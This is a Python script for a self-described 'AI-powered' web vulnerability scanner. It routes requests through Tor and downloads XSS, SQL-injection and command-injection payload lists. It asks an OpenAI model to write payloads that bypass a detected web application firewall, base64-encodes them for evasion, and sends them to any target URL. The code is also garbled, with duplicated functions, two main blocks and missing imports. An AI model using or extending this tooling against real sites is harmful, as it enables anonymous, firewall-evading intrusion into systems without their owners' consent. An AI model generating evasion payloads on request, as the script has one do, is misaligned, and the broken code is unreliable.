import requests
import random
import base64
import re
import openai
import json
import tkinter as tk
from tkinter import messagebox
from bs4 import BeautifulSoup
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Tor proxy configuration
TOR_PROXY = "socks5h://127.0.0.1:9050"

# Function to create a requests session with Tor proxy
def create_tor_session():
    session = requests.Session()
    session.proxies = {
        "http": TOR_PROXY,
        "https": TOR_PROXY
    }
    
    # Optional: Add retries to ensure stability
    retries = Retry(total=5, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
    session.mount("http://", HTTPAdapter(max_retries=retries))
    session.mount("https://", HTTPAdapter(max_retries=retries))

    return session

# Example of making a GET request with Tor proxy
def fetch_with_tor(url):
    session = create_tor_session()
    try:
        response = session.get(url, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
        return None

# Example usage within the payload fetch
def fetch_payloads():
    global payloads
    payloads = {category: [] for category in GITHUB_PAYLOAD_SOURCES}

    session = create_tor_session()
    for category, url in GITHUB_PAYLOAD_SOURCES.items():
        try:
            response = session.get(url, timeout=10)
            if response.status_code == 200:
                payloads[category] = re.findall(r".+", response.text)[:50]  # Limit to 50 payloads for efficiency
                print(f"[+] Loaded {len(payloads[category])} {category} payloads from GitHub")
        except Exception as e:
            print(f"[!] Failed to fetch payloads for {category}: {e}")


# 🔑 OpenAI API Key (Replace with your actual key)
openai.api_key = "your-api-key"

# 📌 GitHub Raw URLs for Payloads
GITHUB_PAYLOAD_SOURCES = {
    "XSS": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/IntrudersXSS.txt",
    "SQLi": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt",
    "RCE": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command-execution-unix.txt",
    "Prototype Pollution": "https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/slides/index.html",
}

# 📥 Fetch Payloads from GitHub
def fetch_payloads():
    global payloads
    payloads = {category: [] for category in GITHUB_PAYLOAD_SOURCES}

    for category, url in GITHUB_PAYLOAD_SOURCES.items():
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                payloads[category] = re.findall(r".+", response.text)[:50]  # Limit to 50 payloads for efficiency
                print(f"[+] Loaded {len(payloads[category])} {category} payloads from GitHub")
        except Exception as e:
            print(f"[!] Failed to fetch payloads for {category}: {e}")

# 🛡️ Detect Web Application Firewall (WAF)
def detect_waf(url):
    headers = {"User-Agent": "Mozilla/5.0 (Pentest-Scanner)"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        waf_patterns = {
            "Cloudflare": "cloudflare",
            "Akamai": "akamai",
            "Imperva": "imperva",
            "Sucuri": "sucuri",
            "AWS WAF": "aws",
            "Barracuda": "barracuda",
            "F5 Big-IP": "big-ip",
        }
        for waf_name, pattern in waf_patterns.items():
            if pattern in response.headers.get("Server", "").lower():
                print(f"[+] Detected WAF: {waf_name}")
                return waf_name
        return "Unknown or No WAF Detected"
    except requests.exceptions.RequestException:
        return "Could not determine WAF"

# 🧠 AI-Powered Payload Mutator
def generate_ai_payload(vuln_type, waf_type):
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": f"Generate an advanced {vuln_type} payload to bypass {waf_type} WAF."},
                {"role": "user", "content": f"Original Payload: {random.choice(payloads[vuln_type])}"}
            ]
        )
        return response["choices"][0]["message"]["content"].strip()
    except Exception as e:
        print(f"[!] AI Payload Mutation Failed: {e}")
        return random.choice(payloads[vuln_type])  # Fallback to GitHub payload

# 🔍 Scan HTTP Headers for Security Issues
def analyze_headers(url):
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        vulnerabilities = []

        security_headers = ["X-XSS-Protection", "X-Frame-Options", "Content-Security-Policy"]
        for header in security_headers:
            if header not in headers:
                vulnerabilities.append(f"Missing {header}")

        return vulnerabilities
    except requests.exceptions.RequestException:
        return ["Failed to retrieve headers"]

# 🔍 Scan JavaScript Files for Security Issues
def analyze_js(url):
    js_vulnerabilities = []
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        script_tags = [script["src"] for script in soup.find_all("script") if "src" in script.attrs]

        for script in script_tags:
            if script.startswith("http"):
                js_response = requests.get(script, timeout=5)
                if "eval(" in js_response.text or "document.cookie" in js_response.text:
                    js_vulnerabilities.append(f"Possible vulnerability in: {script}")
        return js_vulnerabilities
    except Exception:
        return ["Failed to analyze JavaScript"]

# 🔄 Encode Payload (Base64 for WAF Bypass)
def encode_payload(payload):
    return base64.b64encode(payload.encode()).decode()

# 🔍 Test for Vulnerabilities
def test_vulnerability(url, vuln_type, waf_type):
    if vuln_type not in payloads or not payloads[vuln_type]:
        return False
    
    payload = generate_ai_payload(vuln_type, waf_type)
    response = requests.get(url, params={'input': payload})
    
    if vuln_type == "XSS":
        return payload in response.text
    elif vuln_type == "SQLi":
        return "error" in response.text.lower()
    elif vuln_type == "RCE":
        return "uid=" in response.text or "root:" in response.text
    elif vuln_type == "Prototype Pollution":
        return "polluted" in response.text.lower() or "xss" in response.text.lower()
    
    return False

# 🚀 Run Full Scan
def scan_vulnerabilities(url):
    waf_type = detect_waf(url)
    vulnerabilities = []

    for vuln_type in payloads.keys():
        if test_vulnerability(url, vuln_type, waf_type):
            vulnerabilities.append(vuln_type)

    header_issues = analyze_headers(url)
    js_issues = analyze_js(url)

    return vulnerabilities, waf_type, header_issues, js_issues

# 🖥️ GUI Scanner
class VulnerabilityScannerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Ultimate AI-Powered Security Scanner")
        self.root.geometry("700x500")

        tk.Label(root, text="Enter Target URL:", font=("Arial", 12)).pack(pady=10)
        self.url_entry = tk.Entry(root, width=50, font=("Arial", 12))
        self.url_entry.pack(pady=10)

        tk.Button(root, text="Fetch Payloads", command=self.fetch_payloads, font=("Arial", 12)).pack(pady=5)
        tk.Button(root, text="Start Scan", command=self.start_scan, font=("Arial", 12)).pack(pady=10)

    def fetch_payloads(self):
        fetch_payloads()
        messagebox.showinfo("Success", "Payloads fetched from GitHub!")

    def start_scan(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("Error", "Please enter a URL")
            return

        vulnerabilities, waf_type, headers, js_issues = scan_vulnerabilities(url)
        result_message = f"WAF Detected: {waf_type}\n\nVulnerabilities: {', '.join(vulnerabilities)}\n\nHeader Issues: {', '.join(headers)}\n\nJavaScript Issues: {', '.join(js_issues)}"
        messagebox.showinfo("Scan Results", result_message)

# 🎯 Main Execution
if __name__ == '__main__':
    fetch_payloads()
    root = tk.Tk()
    app = VulnerabilityScannerApp(root)
    root.mainloop()
def generate_ai_payload(vuln_type, waf_type):
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[{"role": "system", "content": f"Generate an advanced {vuln_type} payload to bypass {waf_type} WAF."},
                      {"role": "user", "content": f"Original Payload: {random.choice(payloads[vuln_type])}"}]
        )
        return response["choices"][0]["message"]["content"].strip()
    except Exception as e:
        print(f"[!] AI Payload Mutation Failed: {e}")
        return random.choice(payloads[vuln_type])  # Fallback to GitHub payload

# 🔄 Encode Payload (Base64 for WAF Bypass)
def encode_payload(payload):
    return base64.b64encode(payload.encode()).decode()

# 🔍 Test for Vulnerabilities
def test_vulnerability(url, vuln_type, waf_type):
    if vuln_type not in payloads or not payloads[vuln_type]:
        return False
    
    payload = generate_ai_payload(vuln_type, waf_type)
    response = requests.get(url, params={'input': payload})
    
    if vuln_type == "XSS":
        return payload in response.text
    elif vuln_type == "SQLi":
        return "error" in response.text.lower()
    elif vuln_type == "RCE":
        return "uid=" in response.text or "root:" in response.text
    elif vuln_type == "Prototype Pollution":
        return "polluted" in response.text.lower() or "xss" in response.text.lower()
    
    return False

# 🖥️ CLI Interface for Kali Linux (using curses)
def cli_interface(stdscr):
    curses.curs_set(0)  # Hide the cursor
    stdscr.clear()  # Clear the screen
    stdscr.refresh()

    # Title and banner
    stdscr.addstr(0, 0, "Welcome to LIMBO Vulnerability Scanner", curses.A_BOLD)
    stdscr.addstr(2, 0, "----------------------------------------------------", curses.A_BOLD)
    
    stdscr.addstr(4, 0, "Fetching Payloads from GitHub...")
    fetch_payloads()
    stdscr.addstr(5, 0, "Payloads fetched successfully!", curses.A_BOLD)

    stdscr.addstr(7, 0, "Enter Target URL (e.g., https://example.com):")
    stdscr.refresh()
    url_input = ""
    while True:
        key = stdscr.getch()
        if key == 10:  # Enter key
            break
        elif key == 27:  # Escape key
            curses.endwin()
            sys.exit()
        else:
            url_input += chr(key)
        stdscr.addstr(8, 0, f"Target URL: {url_input}", curses.A_BOLD)

    # Run Scan on the input URL
    stdscr.addstr(10, 0, f"Scanning {url_input} for vulnerabilities...")
    vulnerabilities, waf_type, header_issues, js_issues = scan_vulnerabilities(url_input)
    
    stdscr.addstr(12, 0, f"WAF Detected: {waf_type}")
    stdscr.addstr(13, 0, f"Vulnerabilities Found: {', '.join(vulnerabilities) if vulnerabilities else 'None'}")
    stdscr.addstr(14, 0, f"Header Issues: {', '.join(header_issues) if header_issues else 'None'}")
    stdscr.addstr(15, 0, f"JS Issues: {', '.join(js_issues) if js_issues else 'None'}")
    
    stdscr.addstr(17, 0, "Scan Completed. Press any key to exit.")
    stdscr.refresh()
    stdscr.getch()

# 🎯 Main Execution
if __name__ == "__main__":
    curses.wrapper(cli_interface)